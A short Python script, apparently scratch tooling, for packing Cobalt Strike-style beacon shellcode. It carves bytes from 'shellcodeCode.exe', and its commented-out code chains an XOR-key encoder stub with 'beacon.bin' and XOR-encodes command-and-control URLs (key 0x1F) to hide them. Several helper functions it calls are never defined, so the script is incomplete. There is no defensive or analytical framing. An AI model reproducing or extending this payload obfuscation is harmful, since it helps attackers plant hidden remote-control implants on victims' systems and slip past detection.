import random

def EncryptionBeaconData():
    with open('shellcodeCode.exe','rb+') as file:
        with open('a.bin', 'wb+') as save:
            save.write(bytes(file.read()[0x400:0x810]))
    # with open('EncryptionBeaconData.exe','rb+') as file:
    #     with open('Keys_Xor_Encode_x86.bin', 'wb+') as save:
    #         save.write(bytes(file.read()[0x400:0x43E]))



        
if __name__ == '__main__':
    EncryptionBeaconData()
    # with open('Keys_Xor_Encode_x86.bin','rb+') as file:
    #     data = bytearray(file.read())
    #     for i in encodeFile():
    #         data.append(i)
    #     with open('beacon.bin','rb+') as f:
    #         for i in f.read():
    #             data.append(i)
    #     with open('save.bin', 'wb+') as s:
    #         s.write(bytes(data))

    # beaconXor()
    # FileSave()
    # s = 'http://10.37.129.2:8080/hS4m'
    # print(hex(len(s)))
    # s = r"http://127.0.0.1:8080/AVmX"
    # for i in s:
    #     print(str(hex(ord(i) ^ 0x1F)).replace('0x', ' '),end='')
    # print('\n',hex(len(s)))
